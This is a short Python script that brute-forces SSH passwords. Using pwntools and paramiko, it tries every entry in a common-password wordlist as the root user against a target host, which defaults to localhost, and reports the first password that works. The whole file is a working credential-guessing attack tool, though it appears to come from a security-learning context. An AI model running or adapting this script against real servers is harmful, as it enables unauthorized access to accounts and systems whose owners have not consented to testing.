from pwn import *
import paramiko

"""
This script performs a brute-force SSH login attempt using a wordlist.
It tries each password from `ssh-common-passwords.txt` against a target host
with a given username, until it finds a valid password or exhausts the list.

Modules:
- pwn: Provides utility functions including `ssh` for establishing connections.
- paramiko: Used to handle SSH exceptions (e.g., failed authentication).

Configuration:
- host: The target SSH server (default: 127.0.0.1).
- username: The username to authenticate as (default: root).
- attempts: Counter to track the number of password attempts.

Usage:
    python script.py
"""

host = "127.0.0.1"
username = "root"
attempts = 0

# === Brute-Force Password Loop ===
with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")

        try:
            """
            Attempt an SSH connection using the current password.
            - Prints the attempt number and password being tested.
            - If the connection succeeds, the valid password is reported
              and the script stops.
            """
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)

            if response.connected():
                """
                Success case:
                - If the SSH session connects successfully, a valid password
                  has been found.
                - The connection is closed and the loop exits.
                """
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break

            response.close()

        except paramiko.ssh_exception.AuthenticationException:
            """
            Failure case:
            - Raised when authentication fails.
            - Logs the attempt as invalid and continues with the next password.
            """
            print("[X] Invalid password!")

        attempts += 1
